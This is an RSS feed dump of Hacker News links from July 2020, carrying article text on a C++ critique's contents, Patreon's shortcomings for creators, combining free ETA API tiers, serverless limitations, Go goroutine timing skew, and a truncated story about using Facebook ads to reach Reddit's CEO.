Some printers are fussy about the page size. I have formatted it for U.S Letter, 
as it is shorter than A4 and so should avoid any truncation problems. However, 
this is a problem for some A4 printers. If this is the case, replace the line: 
</p><p>
/oldDictCount countdictstack def {letter 
</p><p>
by 
</p><p>
/oldDictCount countdictstack def {a4 
</p><p>
The papertray command might have to be changed from 0 to 1. 
</p><p>
Otherwise, make sure that you have 'uncompress'ed the file, and that you are 
sending it to a PostScript printer. 
</p><pre>Ian Joyner  ACUS (Australian Centre for Unisys Software)    ian@syacus.acus.oz
"Where is the man with all the great directions?...You can't imagine it,
 how hard it is to grow, Can you imagine the order of the universe?" ABWH
Disclaimer:Opinions and comments are personal.
115-117 Wicks Rd, North Ryde, N.S.W Australia 2113
Tel 61-2-390 1328       Fax 61-2-390 1391
</pre>
<hr>
<h3>C++?? A Critique of C++ </h3>
<p>
(2nd Edition) 
</p><p>
© (1992) by Ian Joyner, c/- Unisys - ACUS, 115 Wicks Rd, North Ryde, Australia 
2113, Tel: +61-2-390 1328, Fax +61-2-390-1391, Email/Internet: 
ian@syacus.acus.oz.au 
</p><p>
[Editors note: Permission for publication in The ModulaTor was granted by the 
author in Nov-1992] 
</p><pre><span face="Courier"> Introduction..........................................................4

 The Role of a Programming Language....................................5
   Safety and Courtesy Concerns........................................8

 C++ Specific Criticisms...............................................8
   Virtual Functions...................................................8
   Pure Virtual Functions.............................................11
   The Nature of Inheritance..........................................12
   Function Overloading...............................................13
   Virtual Classes....................................................14
   Name overloading...................................................14
   Polymorphism and Inheritance.......................................16
   '.'  and '-&gt;'......................................................17
   Anonymous parameters in Class Definitions..........................17
   Nameless Constructors..............................................18
   Constructors and Temporaries.......................................18
   Optional Parameters................................................18
   Bad deletions......................................................19
   Local entity declarations..........................................19
   Members............................................................20
   Friends............................................................20
   Static.............................................................21
   Union..............................................................21
   Nested Classes.....................................................21
   Global Environments................................................22
   Header Files.......................................................22
   Class Interfaces...................................................23
   Class header declarations..........................................23
   Garbage Collection.................................................24
   Type-safe linkage..................................................25
   C++ and the software lifecycle.....................................26
   Reusability and Communication......................................27
   Reusability and …</span></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.modulaware.com/mdlt28.htm">https://www.modulaware.com/mdlt28.htm</a></em></p>]]>
            </description>
            <link>https://www.modulaware.com/mdlt28.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-23745291</guid>
            <pubDate>Mon, 06 Jul 2020 06:39:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Three things you should know before starting a Patreon page]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23745272">thread link</a>) | @exolymph
<br/>
July 5, 2020 | http://pencerw.com/feed/2020/6/24/three-things-all-creators-should-know-about-patreon | <a href="https://web.archive.org/web/*/http://pencerw.com/feed/2020/6/24/three-things-all-creators-should-know-about-patreon">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-0e74a9a2acebd70c05fe"><div><p>For the three years starting in April of 2017, I ran much of <a href="http://theprepared.org/newsletter" target="_blank">The Prepared’s</a> (and ultimately my family’s) income through Patreon. I started doing so as an experiment - one that by any measure has been a success. But while Patreon was instrumental in that process, I recommend that creators <strong>not</strong> structure their incomes and careers around Patreon. Here’s why.</p><p>Like many creators, I chose Patreon’s “pay by the creation” (rather than “pay by the month) mode. This directly incentivizes creators to continue doing the actual work, and keeps them accountable to the commitments they make. </p><p>But what Patreon doesn’t tell you is that fans can optionally set a monthly cap on their spending, and that cap can be arbitrarily low - even <strong>less than your per-creation commitment level.</strong> In other words, a reader of my weekly newsletter could pledge $5 per newsletter, but then set a $2 monthly cap. The worst part about this is that there’s literally nowhere in the Patreon backend that I can see this cap. I spoke to Patreon’s product team about this in late 2018, and they told me that the best thing I could do is to look at my creation-by-creation analytics at the end of the month and see which of my patrons paid for which creations; if a person doesn’t show up at the end of the month, then they must have set a cap.</p><p>This is a totally unscalable solution, and it makes the process of issuing patron rewards excruciatingly hard to manage. Creators need the ability to quickly and easily determine <strong>who</strong> is paying them for <strong>what</strong>; Patreon makes this impractically hard.</p><p>Further:</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1593267194369_49688"><div><ul data-rte-list="default"><li><p>Patreon provides email alerts for when a new patron makes a pledge, but has <strong>no email or push notifications for when patrons delete pledges.</strong> </p></li><li><p>Patreon has no creator-side notification system for declined charges or charges that are flagged for fraud. Worse yet, their patron-side notification system appears to be totally ineffective; many long time patrons (and personal friends of mine) were genuinely shocked to hear, many months later, that their monthly charges had been declined - leading to their pledges being automatically canceled by Patreon. Even worse, Patreon’s “Declines” page, which shows the total declined amount on a month by month basis, has no way of showing which patrons’ pledges were declined - you instead need to go into the “Relationship Manager” and filter by “Declined” to see whose charges have gone through, and when.</p></li><li><p>If you, as a creator, go through all of the effort to find charges that<em> </em>have been declined or marked as fraud, it can then be really difficult to recoup that revenue. This is mostly a result of the fact that most Patreon creators charge a small amount of money (a couple dollars) per month. In theory you could email or message the patron when their charge doesn’t go through, but in practice it feels a bit weird to be hounding someone over (say) $4. If the pledge was billed on an annual basis, though, it might be a big enough sum to warrant the effort. </p></li><li><p>Patreon uses accounting terms with little regard for their generally accepted meaning. See the screenshot above, which is titled “Earnings Projections” but then actually lists <em>gross revenue.</em> In accounting, <em>earnings</em> is the same as <em>profit - </em>it’s what a company has left <strong>after every expense is paid, </strong>whereas <em>gross revenue</em> is the total amount that a company takes in and doesn’t take into account expenses at all. In other words, Patreon is suggesting that the numbers here are what will be deposited into my bank account - but once Patreon takes their platform fees, it’ll actually be significantly less. This kind of sloppy terminology is all over Patreon’s creator backend, and no matter how you slice it is either the result of gross incompetence or a deliberate desire to deceive creators.</p></li></ul><p>Between credit card processing fees (2.9% plus $0.30 per transaction) and Patreon’s cut (between 5% and a whopping 12%), your earnings will be <em>significantly</em> less than your top line pledged amount. In practice, I saw total fees of between 8-12%. (Note: I signed up for Patreon before they shifted to tiered pricing, and now have a “Founder” Pro plan at a 5% platform fee rate. If you signed up for a Pro or Premium account today, you’d pay Patreon 3% or 7% more than I do, respectively.)</p><p>If Patreon were actively bringing customers to me - if normal people were just out there browsing Patreon for awesome things to support - then that might make sense. <strong>But the reality is that success on Patreon is inextricably tied to having your own platform and community.</strong> All Patreon does is manage recurring payment processing - a commodity service that many companies do for a drastically lower fee structure. Sure, ostensibly you can also be having conversations with patrons, generating some kind of community there, etc - but every step you take to encourage users to interact with you on Patreon, the more you undermine your own platform. In other words, Patreon engages in rent seeking - but they ultimately do it on <strong>your</strong> platform, and don’t bring a built-in audience with which to raise you higher.</p><p>When I transitioned off of Patreon, I moved to a combination of Quickbooks Online ($645/year; note that <a href="https://www.propublica.org/article/inside-turbotax-20-year-fight-to-stop-americans-from-filing-their-taxes-for-free" target="_blank">Intuit is a terrible company</a>) and Squarespace’s ($480/year) recurring products feature. The result is that my processing fees dropped dramatically. At my peak Patreon earnings, I was spending almost $300/month ($3600/year) on Patreon’s platform fees. My current revenue is roughly 3x what it was then, but I’m paying 68% less than I used to be.<strong> My current payments, web hosting, and accounting software outlay is $1,125 a year; if I had remained on Patreon my annual fees would be about $10,000.</strong></p><p>Okay, you’re saying - so Patreon isn’t the perfect all-in-one platform that will allow me to bill, chat with, and build my audience. But maybe it’s a piece of a larger puzzle?</p><p>It’s a great idea, but unfortunately Patreon does a terrible job integrating with the other services that I use to run my business.</p><p>The first thing I’d want from Patreon is an easy way to automatically share my content (which most creators distribute elsewhere - for me, it’s Mailchimp) to Patreon. But while Patreon does have a public API, it’s poorly developed (there is no sandbox/testing area, and the most recent updates to <a href="https://github.com/Patreon/patreon-python" target="_blank">their API libraries</a> are from January of 2019) and only allows browsing/looking up data on Patreon; you cannot post content to your Patreon account via the API. This lack of functionality also exists in Zapier’s implementation of the Patreon API: You can use Patreon as a trigger, but not as an action.</p><p>What this means is that creators are inherently tied to Patreon’s terrible, horrible, clicky clicky GUI. You are completely tied to the limitations that are built into Patreon’s web product, and don’t have the ability to build automations that’ll speed up your content and customer management.</p><p>Patreon also fails to integrate well with accounting software - something that flies in the face of their promise to give creators “the stability you need to build an independent creative&nbsp;career.” Their API (and Zapier’s implementation of it) only provides <em>pledge</em> activity, and is therefore inaccurate (caps, declines, and fraud aren’t factored in - it’s a guesstimate at what you might make in the future) in all of the ways described above.</p><p>I really can’t stress this enough: <strong>If your intention is to build a meaningful income, there are much better options out there than Patreon. </strong>What Patreon <em>does</em> offer is a quick way to see whether people on the internet will pay you a little money for something that you’re already doing for free. </p><p>This is a nontrivial thing, but it’s something that you should really think through before you start a Patreon page. If it’s a success, then it’ll likely make a lot of sense for you to transition <em>off</em> of Patreon at some point in the foreseeable future. That might be fine - especially if you’re really early on and success feels like a longshot - but The Prepared’s transition off of Patreon required a lot of management on my part and resulted in roughly 1/3 of my patrons dropping their pledges. </p><p>To be clear: I’m deeply appreciative of all of the people and companies who supported me through Patreon, and it really is true that those first couple of dollars made a big impact in the path of my career. But Patreon as a platform did remarkably little to support me along that journey, even after I became a moderately successful creator and took quite a bit of time to explain my frustrations to both their customer service &amp; user research teams.</p></div></div></div>]]>
            </description>
            <link>http://pencerw.com/feed/2020/6/24/three-things-all-creators-should-know-about-patreon</link>
            <guid isPermaLink="false">hacker-news-small-sites-23745272</guid>
            <pubDate>Mon, 06 Jul 2020 06:35:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to process more than 350K requests per month free using 3 free ETA services]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 4 (<a href="https://news.ycombinator.com/item?id=23745223">thread link</a>) | @Gen1us
<br/>
July 5, 2020 | https://blog.maddevs.io/how-to-make-three-paid-eta-services-one-free-6edc6affface | <a href="https://web.archive.org/web/*/https://blog.maddevs.io/how-to-make-three-paid-eta-services-one-free-6edc6affface">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://blog.maddevs.io/@meder33kg?source=post_page-----6edc6affface----------------------" rel="noopener"><img alt="Akkozov Meder" src="https://miro.medium.com/fit/c/96/96/2*87H69ujCEx7VLZYSZPQyig.jpeg" width="48" height="48"></a></p></div></div></div></div><figure><div><div><div><p><img alt="Estimated time of arrival." src="https://miro.medium.com/max/8000/1*q9EOHqrYhaLpY1ZIL0C4Qw.jpeg" width="4000" height="2172" srcset="https://miro.medium.com/max/552/1*q9EOHqrYhaLpY1ZIL0C4Qw.jpeg 276w, https://miro.medium.com/max/1104/1*q9EOHqrYhaLpY1ZIL0C4Qw.jpeg 552w, https://miro.medium.com/max/1280/1*q9EOHqrYhaLpY1ZIL0C4Qw.jpeg 640w, https://miro.medium.com/max/1400/1*q9EOHqrYhaLpY1ZIL0C4Qw.jpeg 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*q9EOHqrYhaLpY1ZIL0C4Qw.jpeg?q=20"></p></div></div></div><figcaption>Estimated time of arrival</figcaption></figure><p id="cce6">This is a story on how to not spend even a penny by using three ETA (estimated time of arrival) services instead of one. Everything is based on my personal experience working as a back-end developer at GoDee project. GoDee is a start-up project that offers booking seats on a bus online. You could find more information about this project here:</p><p id="e338">GoDee is a public transportation service. Bus transportation by GoDee is more convenient than motorbikes common for Southeast Asia and cheaper than a taxi. The app-based system allows users to find an appropriate route, select the time, book the seat, and pay for the ride online. And one of the problems of GoDee is traffic jams that severely impact the user experience. Users get tired of waiting and get annoyed by trying to guess the bus arrival time. So, to make the commuting more convenient, it needed service to calculate the bus’s approximate arrival time, aka ETA.</p><p id="5226">Developing ETA from scratch would take at least a year. So, to speed up the process, GoDee decided to implement the Google Distance Matrix API tool. Later they developed their own Pifia micro-service.</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/500/1*vq9Ao08BtAdAMx5OYhbSlA.gif" width="250" height="429" data-old-src="https://miro.medium.com/freeze/max/34/1*vq9Ao08BtAdAMx5OYhbSlA.gif?q=20"></p></div></div></figure><p id="b97d">Over time, the business grew, and the user base increased. We encountered a problem with increasing requests in the Google Distance Matrix API.</p><h2 id="8971">Why is this a problem?</h2><p id="2a4f">Because every request costs money, Google API provides 10.000 free queries per month, after which every 1.000 queries are charged $20. At that time, we had about 150,000 requests per month.</p><p id="7492">My mentor was very dissatisfied with that. And said that system should change caching to store ETA every 30 minutes. At that time, the system sent requests to the Google API every 3 seconds to get fresh data. However, such a caching algorithm wasn’t efficient, since minibuses were stuck in traffic. And so the distance only changed once every ten minutes. There was another nuance. For example, five users are asking for information about the same bus, and this is the same request. The cache solved this type of problem.</p><figure><div></div><figcaption>Сache Code</figcaption></figure><p id="8a43">The cache worked, but not for long since GoDee grew even further and faced the same problem — the number of queries has increased again.</p><p id="9a57">It was decided to replace the Google API with OSRM. Basically, OSRM is a service for building a route based on ETA (this is a rough but the short description, if you need details, here is the <a href="http://project-osrm.org/" target="_blank" rel="noopener">link</a>).</p><blockquote><p id="113f">The Open Source Routing Machine or OSRM is a C++ implementation of a high-performance routing engine for the shortest paths in road networks.</p><p id="15be">Wikipedia.</p></blockquote><p id="97d4">OSRM has one problem: it builds routes and calculates ETA without taking traffic into account. To solve this problem, I started looking for services that can provide information about traffic in the specified part of the city. HERE Traffic was providing the data I needed. After a little study of the documentation, I wrote a small code that gets traffic information every 30 minutes. And to upload traffic information to OSRM, I wrote a small script with the command <code>./osrm-contract data.osrm --segment-speed-file updates.csv</code> (more details <a href="https://github.com/Project-OSRM/osrm-backend/wiki/Traffic" target="_blank" rel="noopener">here</a>).</p><p id="cbda">Math time: every half of the hour, there is a request to HERE to get traffic information this are two requests per hour, that is, a day is 48 requests (24 * 2 = 48) and a month is about ≈ 1.488 (48*31 = 1.488) a year 17.520. Yes, we have these free requests from HERE for 15 years would be enough.</p><figure><div></div><figcaption>Code for getting traffic</figcaption></figure><p id="b1d9">Preliminary tests showed that the service works perfectly, but there is a problem, HERE gives traffic information in “gibberish” and the data does not match the OSRM format. In order for the information to fit, you need to use another service HERE for geocoding + OSRM (for getting points on the map). This is approximately 450.000 requests per month. Later, OSRM was abandoned because the number of requests exceeded the free limit. We didn’t give up and enabled the HERE Distance Matrix API and temporarily removed the Google Distance Matrix API. The logic HERE is simple: we send coordinates from point A to point B and get the bus arrival time.</p><figure><div></div></figure><p id="2e81">After we installed everything on the test server and started checking, we received the first feedback from the testers. They said that ETA reads the time incorrectly. We started looking for the problem, looked at logs (we used Data dog for logs), logs, and tests showed that everything works perfectly. We decided to ask about the problem in a little more detail, and it turned out that if the car is in traffic for 15 minutes, ETA shows the same time. We decided that this is because of the cache because it stores the original time and does not update it for 30 minutes.</p><p id="1d5a">We started looking for the problem, at the beginning we checked the data on the web version of the HERE Distance Matrix API (which is called we go here), everything worked fine, we received the same ETA. This problem was also checked on the google map service. There was no problem. The services themselves show this ETA. We explained everything to testers and businesses, and they accepted everything.</p><p id="18ce">Our team lead suggested connecting another ETA service and returning the Google API as a backup option and writing code with the logic of switching services (the switch was needed if the requests pass the free number of requests).</p><p id="e9c2">The code works the following way:</p><pre><span id="b4e7">val = getCount() // getting the number of queries used</span><span id="9ff9"><em>if</em> getMax() &lt;= val { // checking for the limit of free requests for the service used</span><span id="e935">newService = switchService(s) // // if the limit is reached, switch the service return</span><span id="cae7"><em>return</em> newService(from, to) // giving the logic of the new service </span></pre><p id="054f">We found the following Mapbox service, connected it, installed it, and it worked. As a result, our ETA had:</p><blockquote><p id="625d">“Here” — 250,000 free requests per month<br>Google — 10,000 free requests per month<br>Mapbox — 100,000 free requests per month</p></blockquote><p id="4def">Always look for alternatives, sometimes it happens that the business doesn't want to pay the money for the service and refuses it. As a developer who has worked hard on the service, you should bring the task to real use. This article describes how we were trying to connect more services for the free use of ETA because the business did not want to pay for the service.</p><p id="4330">P.S. As a developer, I believe that if the tool is good and does its job well, then you can pay for the tool’s services (or find Open source projects :D).</p><figure><div></div></figure></div></div></section></div></div>]]>
            </description>
            <link>https://blog.maddevs.io/how-to-make-three-paid-eta-services-one-free-6edc6affface</link>
            <guid isPermaLink="false">hacker-news-small-sites-23745223</guid>
            <pubDate>Mon, 06 Jul 2020 06:26:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Overcoming Serverless Limitations]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23745034">thread link</a>) | @linuxdude
<br/>
July 5, 2020 | https://talkingserverless.com/2020/07/05/overcoming-serverless-limitations/ | <a href="https://web.archive.org/web/*/https://talkingserverless.com/2020/07/05/overcoming-serverless-limitations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-330">

	

	
		<p><img width="2240" height="1260" src="https://talkingserverless.com/wp-content/uploads/2020/07/Oakbur-Quill-Co.-1.png?is-pending-load=1" alt="" data-attachment-id="333" data-permalink="https://talkingserverless.com/2020/07/05/overcoming-serverless-limitations/oakbur-quill-co-2/" data-orig-file="https://i0.wp.com/talkingserverless.com/wp-content/uploads/2020/07/Oakbur-Quill-Co.-1.png?fit=2240%2C1260&amp;ssl=1" data-orig-size="2240,1260" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Oakbur Quill Co." data-image-description="" data-medium-file="https://i0.wp.com/talkingserverless.com/wp-content/uploads/2020/07/Oakbur-Quill-Co.-1.png?fit=300%2C169&amp;ssl=1" data-large-file="https://i0.wp.com/talkingserverless.com/wp-content/uploads/2020/07/Oakbur-Quill-Co.-1.png?fit=1024%2C576&amp;ssl=1" data-lazy-srcset="https://i0.wp.com/talkingserverless.com/wp-content/uploads/2020/07/Oakbur-Quill-Co.-1.png?w=2240&amp;ssl=1 2240w, https://i0.wp.com/talkingserverless.com/wp-content/uploads/2020/07/Oakbur-Quill-Co.-1.png?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/talkingserverless.com/wp-content/uploads/2020/07/Oakbur-Quill-Co.-1.png?resize=1024%2C576&amp;ssl=1 1024w, https://i0.wp.com/talkingserverless.com/wp-content/uploads/2020/07/Oakbur-Quill-Co.-1.png?resize=768%2C432&amp;ssl=1 768w, https://i0.wp.com/talkingserverless.com/wp-content/uploads/2020/07/Oakbur-Quill-Co.-1.png?resize=1536%2C864&amp;ssl=1 1536w, https://i0.wp.com/talkingserverless.com/wp-content/uploads/2020/07/Oakbur-Quill-Co.-1.png?resize=2048%2C1152&amp;ssl=1 2048w, https://i0.wp.com/talkingserverless.com/wp-content/uploads/2020/07/Oakbur-Quill-Co.-1.png?resize=1200%2C675&amp;ssl=1 1200w" data-lazy-sizes="(max-width: 2240px) 100vw, 2240px" data-lazy-src="https://talkingserverless.com/wp-content/uploads/2020/07/Oakbur-Quill-Co.-1.png?is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">		</p><!-- .post-thumbnail -->

	
	<div>
		




<p>While Serverless provides<a href="https://talkingserverless.com/2020/05/12/serverless-a-developer-perspective/"> developers many advantages</a>, they also impose many constraints on developers in terms of architecture, deployment options, etc.. While these constraints<a href="https://talkingserverless.com/2020/06/08/top-considerations-for-serverless-developers/"> require developers</a> to change the way they develop and deploy their applications, there are many ways developers can overcome these limitations or find a workaround to manage them gracefully. As we attend meetups, we hear many questions/concerns from developers about the Serverless limitations. In this post, we will talk about some of the limitations and how developers can overcome these limitations.</p>



<ul><li><b>Stateful Applications:</b> Functions as a Service started off as a platform for stateless applications but the trend is changing slowly. It is possible to maintain the state between invocations using various data stores offered by the cloud providers but it came with enormous operational overhead, complexity, and runaway costs / poor SLAs when not managed properly. Now, many new vendors like<a href="https://go.zoho.com/yIl"> Zoho Catalyst</a> or Nimbella are offering FaaS platforms with integrated data stores, giving developers an easy option to build stateful applications</li><li><b>Mitigating DDOS:</b> Pay per invocation model of FaaS brings this question into focus as developers (and other decision-makers) ponder using FaaS in their organizations. The DDOS risk is not any different from DDOS attacks on applications running on containers or virtual machines but the correlation between the number of invocations of the function with costs amplifies the threat. In many cases, FaaS vendors may try to reduce the impact of DDOS but the users also bear the responsibility to mitigate the attacks. They can use services like Cloudflare to fend away DDOS attacks. They can also resort to throttling as a way to fend off DDOS attacks but, when used pre-emptively, it may end up impacting the application. Using an alerting mechanism for DDOS and then taking quick remediation like throttling may also help. Some FaaS providers like AWS allow developers to use API Gateway with a key, thereby, limiting the access to API gateways</li><li><b>Latency Issues:</b> When a Serverless platform is used to deploy a small component of a larger complex application, latency could be an impact as these components talk to the rest of the application through REST API calls. This latency in the inter-component communications along with the fact that that the other components of the application may be deployed using other services offered by the cloud provider from a different location may impact, adding latency. This can be mitigated using a loosely coupled architecture like Microservices architecture where FaaS can be used for one or more Microservices</li><li><b>Scaling Issues:</b> While using certain FaaS services for stateful applications, there could be scaling issues. Stress on the datastore could be timing out the requests sent through various API Gateway endpoints. One way to mitigate this is by using one endpoint for writing to the data store and one for reading the data. Now the load can be distributed better by using a Queuing service while writing to the datastore. For the most part, these constraints can be mitigated by using smarter architecture but it may not always be the possibility</li><li><b>Cold Start Problem:</b> Cold start may appear like a problem in FaaS but it is leveraged by cloud providers to provide the service at such low costs. Some providers impose cold start as a constraint but others keep the containers encapsulating the functions warm to avoid the cold start problem. If your application’s user experience cannot afford cold start, it is better to pick a provider who keeps the containers warm to avoid the cold start problem</li><li><b>Integration Testing:</b> One of the biggest problems faced by developers is Integration Testing. In traditional environments, developers will have all the components available locally and they can do the integration testing before the code is pushed into the DevOps pipeline. With FaaS, it is not possible. One way to overcome this limitation is to do the integration testing remotely with the cloud provider than doing it locally. Since FaaS provides a cost-effective way to deploy the application, using the service for dev and test is the right way to deploy applications. This also removes the usual friction that happens between developer and ops teams where each team blames the other for the application failures due to differences in environment</li><li><b>Vendor Lock-in:</b> Vendor lock-in is definitely a limitation with Serverless computing. Some vendors mitigate this risk by offering their service based on an open-source FaaS offering. However, this mitigation is superficial as most of the lock-in happens with the application dependencies like the database service used, etc.. Instead, our suggestion is to use disposable applications while using FaaS. FaaS reduces the cost of deploying applications but it also reduces the cost of developing applications. This combination of a reduction in development and deployment costs is the secret behind the success of FaaS. Disposable applications are applications that cost less to create a new application than change the application as you move from one type of service to another or move cloud providers. By using disposable applications, users need not worry about the lock-in costs and they can focus on building apps and deploying them quickly. When the time to change comes, they can just throw away the existing application and quickly build a new one</li></ul>



<p>Yes, Serverless computing adds lots of constraints for developers and these constraints help the cloud providers to offer the service at a very low cost. By understanding the limitations, developers can easily mitigate the impact of limitations.</p>

	</div><!-- .entry-content -->

	</article></div>]]>
            </description>
            <link>https://talkingserverless.com/2020/07/05/overcoming-serverless-limitations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23745034</guid>
            <pubDate>Mon, 06 Jul 2020 05:39:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Go lesson learned: sometimes I don't want to use goroutines if possible]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23744957">thread link</a>) | @todsacerdoti
<br/>
July 5, 2020 | https://utcc.utoronto.ca/~cks/space/blog/programming/GoWhenNotManyGoroutines | <a href="https://web.archive.org/web/*/https://utcc.utoronto.ca/~cks/space/blog/programming/GoWhenNotManyGoroutines">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>A Go lesson learned: sometimes I don't want to use goroutines if possible</h2>

	<p><small>July  5, 2020</small></p>
</div><div><p>We have a heavily NFS based server environment <a href="https://support.cs.toronto.edu/">here</a>, with <a href="https://utcc.utoronto.ca/~cks/space/blog/linux/ZFSFileserverSetupIII">multiple NFS servers</a> and an IMAP server that accesses
all mailboxes over NFS. That IMAP server has had <a href="https://utcc.utoronto.ca/~cks/space/blog/linux/LoadAverageIMAPImpactQuestion">ongoing issues
with elevated load averages</a>,
and what at least seems to be IMAP slowness. However, our current
metrics leave a lot of uncertainties about the effects of all of
this, because we basically only have a little bit of performance
data for a few IMAP operations. One thing I'd like to do is gather
some very basic Unix level NFS performance data from our IMAP server
and from some other machines, to see if I can see anything.</p>

<p>One very simple metric is how long it takes to read a little file
from every NFS filesystem we have mounted on a machine. As it
happens, we already have the little files (they're used for another
system management purpose), so all I need is a program to open and
read each one while timing how long it takes. There's an obvious
issue with doing this sequentially, which is that if there's a
single slow filesystem, it could delay everything else.</p>

<p>The obvious answer here was Go, goroutines, and some form of goroutine
pool. Because the goroutines just do IO (and they're only being
used to avoid one bit of IO delaying another separate bit), the
natural size of the goroutine pool is fairly large, say 50 to 100
goroutines (<a href="https://utcc.utoronto.ca/~cks/space/blog/sysadmin/ManyNFSFilesystemsWhy">we have a lot of NFS filesystems</a>).  This is quite easy and obvious
to implement in Go, so I put together a little Go program for it
and watched the numbers it generated as they jumped around.</p>

<p>Then, out of reflexive caution, I tried running the same program
with a goroutine pool size of 1, which more or less forced serial
execution (the pool goroutine infrastructure was still active but
there was only one worker goroutine doing all the reading). To my
surprise the 'time to read a file' number for all filesystems was
visibly and decidedly lower. I could run the program side by side
with the two different goroutine pool sizes and see this clearly.</p>

<p>Some thinking gave me a possible reason why this is so. My core
code does essentially the following (minus error checking):</p>

<blockquote><pre>start := time.Now()
file, err := os.Open(target)
n, err := file.Read(buffer)
duration := time.Now().Sub(start)
</pre>
</blockquote>

<p>This sequence makes two system calls and <a href="https://utcc.utoronto.ca/~cks/space/blog/programming/GoSchedulerAndSyscalls">each system call is a
potential goroutine preemption point</a>. If
a goroutine gets preempted during either system call, it can only
record the finishing time once it's scheduled again (and finishes
the read, if it was preempted in the open). If there are 50 or more
goroutines all doing this, some of them could well be preempted and
then not scheduled for some time, and that scheduling delay will
show up in the final duration. When there aren't multiple goroutines
active, there should be very little scheduling delay and the recorded
durations (especially the longest durations) will be lower. And the
ideal situation for essentially no goroutine contention is of course
one goroutine.</p>

<p>(Technically this makes two more system calls to get the time at
the start and the end of the sequence, but on modern systems,
especially Linux, these don't take long enough to trigger <a href="https://utcc.utoronto.ca/~cks/space/blog/programming/GoSchedulerAndSyscalls">Go's
system call preemption</a> and probably don't
even enter the kernel itself.)</p>

<p>Because I still worry about individual slow filesystems slowing
everything down (or stalls on some filesystems), my solution was a
more complicated work pool approach that starts additional worker
goroutines only when all of the current ones seem to have stalled
for too long.  If all goes well (and it generally does in my testing),
this runs with only one goroutine.</p>

<p>(My current code has the drawback that once the goroutine worker
pool expands, all of them stay active, which means that enough
slow filesystems early on in the checks could get me back to the
thundering herd problem. I'm still thinking about that issue.)</p>
</div></div>]]>
            </description>
            <link>https://utcc.utoronto.ca/~cks/space/blog/programming/GoWhenNotManyGoroutines</link>
            <guid isPermaLink="false">hacker-news-small-sites-23744957</guid>
            <pubDate>Mon, 06 Jul 2020 05:21:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Facebook Ads to Land an Interview at Reddit]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23744652">thread link</a>) | @shsachdev
<br/>
July 5, 2020 | https://www.careerfair.io/reviews/how-to-land-interview-using-fb-ads | <a href="https://web.archive.org/web/*/https://www.careerfair.io/reviews/how-to-land-interview-using-fb-ads">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>
    The traditional way to get a job interview is to submit your resume and pray. 
    </p>
    <p>
    Everyone does this and it’s taken to be the default because it’s easy. You can send the same resume with the click of a button to totally different companies, no effort on your part other than preparing the resume.
    </p>
    <center>
            <img src="https://www.careerfair.io/assets_fbads/resume_blast.png" width="515" height="354" alt="">
              </center>


    
    <p>
    There’s no way to stand out, no uniqueness. 
    </p>
    <p>
    Generally, the way to get around this is to ask for a referral or to reach out to someone at the company for some sort of informational interview. Both of these methods allow for a more personalized approach to job hunting. 
    </p>
    <p>
    But is it possible to go even one step further? 
    </p>
    
    
    
    <p>
    In 2016, <a href="https://www.linkedin.com/in/dumbfounder/">Chris Seline</a> was coming off a failed startup and looking for new opportunities. 
    </p>
    <p>
    Unlike most other people, though, Chris wasn’t a fan of the resume blast method. 
    </p>
    <p>
    His strategy was to target specific companies and try to get noticed creatively rather than use the traditional channels and get lost in the shuffle. 
    </p>
    <p>
    Chris decided that he really wanted to work for Reddit. 
    </p>
    <p>
    His plan was to write a <a href="https://twicsy-blog.tumblr.com/post/135712326189/hey-reddit-lets-make-some-recommendations">blog post</a> and then email it to the CEO of Reddit. 
    </p>
    <p>
    The blog post is thorough - it’s 2000 words, technical, and you can tell a lot of effort was put into it. 
    </p>
    <p>
    Even if Chris had emailed his post to the Reddit CEO, there’s a strong chance he would have gotten an interview. 99% of applicants don’t put this much effort into an application and receiving such a personalized email is a positive signal. 
    </p>
    <p>
    But Chris didn’t just email him. 
    </p>
    
    
    
    <p>
    He decided to use Facebook Ads to target the CEO of Reddit (Steve Huffman). 
    </p>
    <p>
    Here’s how he did it:
    </p>
    <ol>
    
    <li>Find the Reddit CEO’s public Facebook profile
    
    </li><li>Use this to find out where he lived, what he liked, what he was interested in, etc
    
    </li><li>Use the above to run a super targeted FB Ads Campaign
    </li>
    </ol>
    <p>
    Note that Chris only wanted <em>one</em> person to click on this Ad, that’s why he had to go super targeted. 
